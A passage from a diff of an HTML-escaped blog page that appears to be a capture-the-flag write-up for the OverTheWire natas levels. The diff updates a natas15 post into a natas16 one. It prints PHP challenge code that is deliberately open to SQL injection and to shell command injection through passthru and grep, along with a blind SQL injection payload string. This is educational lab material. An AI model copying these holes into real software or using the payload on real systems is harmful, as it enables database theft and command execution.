 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;http://natas.labs.overthewire.org/js/jquery-ui.js&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;http://natas.labs.overthewire.org/js/wechall-data.js&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;http://natas.labs.overthewire.org/js/wechall.js&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#00a8c8&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;wechallinfo&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;level&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;natas15&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;pass&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;&amp;lt;censored&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;};&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#00a8c8&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;wechallinfo&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;level&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;natas16&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;pass&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;&amp;lt;censored&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;};&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;natas15&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;natas16&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;content&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;CREATE TABLE `users` (
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  `username` varchar(64) DEFAULT NULL,
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  `password` varchar(64) DEFAULT NULL
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;*/
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;if(array_key_exists(&amp;#34;username&amp;#34;, $_REQUEST)) {
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    $link = mysqli_connect(&amp;#39;localhost&amp;#39;, &amp;#39;natas15&amp;#39;, &amp;#39;&amp;lt;censored&amp;gt;&amp;#39;);
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    mysqli_select_db($link, &amp;#39;natas15&amp;#39;);
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    $query = &amp;#34;SELECT * from users where username=\&amp;#34;&amp;#34;.$_REQUEST[&amp;#34;username&amp;#34;].&amp;#34;\&amp;#34;&amp;#34;;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    if(array_key_exists(&amp;#34;debug&amp;#34;, $_GET)) {
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        echo &amp;#34;Executing query: $query&amp;lt;br&amp;gt;&amp;#34;;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    $res = mysqli_query($link, $query);
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    if($res) {
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    if(mysqli_num_rows($res) &amp;gt; 0) {
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        echo &amp;#34;This user exists.&amp;lt;br&amp;gt;&amp;#34;;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    } else {
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        echo &amp;#34;This user doesn&amp;#39;t exist.&amp;lt;br&amp;gt;&amp;#34;;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    } else {
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        echo &amp;#34;Error in query.&amp;lt;br&amp;gt;&amp;#34;;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    mysqli_close($link);
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;} else {
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;index.php&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Username: &lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;Check existence&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;For security reasons, we now filter even more on certain characters&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;/&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Find words containing: &lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;needle&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;submit&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;submit&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;Search&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php } ?&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Output:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;pre&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;$key = &amp;#34;&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;if(array_key_exists(&amp;#34;needle&amp;#34;, $_REQUEST)) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    $key = $_REQUEST[&amp;#34;needle&amp;#34;];
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;if($key != &amp;#34;&amp;#34;) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    if(preg_match(&amp;#39;/[;|&amp;amp;`\&amp;#39;&amp;#34;]/&amp;#39;,$key)) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        print &amp;#34;Input contains an illegal character!&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    } else {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        passthru(&amp;#34;grep -i \&amp;#34;$key\&amp;#34; dictionary.txt&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;pre&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;viewsource&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;index-source.html&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;View sourcecode&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h4 id=&#34;what-does-this-code-do&#34;&gt;What does this code do?&lt;/h4&gt;
 &lt;p&gt;The important selection out of all of that code is this:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$query = &amp;#34;SELECT * from users where username=\&amp;#34;&amp;#34;.$_REQUEST[&amp;#34;username&amp;#34;].&amp;#34;\&amp;#34;&amp;#34;;
-    if(array_key_exists(&amp;#34;debug&amp;#34;, $_GET)) {
-        echo &amp;#34;Executing query: $query&amp;lt;br&amp;gt;&amp;#34;;
-    }
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if(array_key_exists(&amp;#34;needle&amp;#34;, $_REQUEST)) {
+    $key = $_REQUEST[&amp;#34;needle&amp;#34;];
+}
 
-    $res = mysqli_query($link, $query);
-    if($res) {
-    if(mysqli_num_rows($res) &amp;gt; 0) {
-        echo &amp;#34;This user exists.&amp;lt;br&amp;gt;&amp;#34;;
+if($key != &amp;#34;&amp;#34;) {
+    if(preg_match(&amp;#39;/[;|&amp;amp;`\&amp;#39;&amp;#34;]/&amp;#39;,$key)) {
+        print &amp;#34;Input contains an illegal character!&amp;#34;;
     } else {
-        echo &amp;#34;This user doesn&amp;#39;t exist.&amp;lt;br&amp;gt;&amp;#34;;
+        passthru(&amp;#34;grep -i \&amp;#34;$key\&amp;#34; dictionary.txt&amp;#34;);
     }
-    } else {
-        echo &amp;#34;Error in query.&amp;lt;br&amp;gt;&amp;#34;;
-    }
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This code snippet submits the sent data from the &lt;strong&gt;natas15 index page&lt;/strong&gt; and parses it into a SQL query that boils down to:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Select * FROM users WHERE username=&amp;#34;sentData&amp;#34;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Easy, basic &lt;strong&gt;SQL injection&lt;/strong&gt; just like the last time right? Welp, not so soon since this time, there is no output except for an existance confirmation, a &amp;ldquo;does not exist return&amp;rdquo; and a sql querry error statement. So now that we know that we can`t output anything, what are we supposed to do?&lt;br&gt;
-The 3 type of returns are actually very usefull since you can send data packets and get confirmation about the packets. The approach idea is to try every possible combination tailored with what we know that the output should be and how it should look and watch out for validation.&lt;/p&gt;
-&lt;h4 id=&#34;in-practice-how-can-it-be-done&#34;&gt;In practice, how can it be done?&lt;/h4&gt;
-&lt;p&gt;The SQL injection statement will look like this:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;natas16&amp;#34; AND password LIKE BINARY &amp;#34;%letter%&amp;#34; &amp;#34;
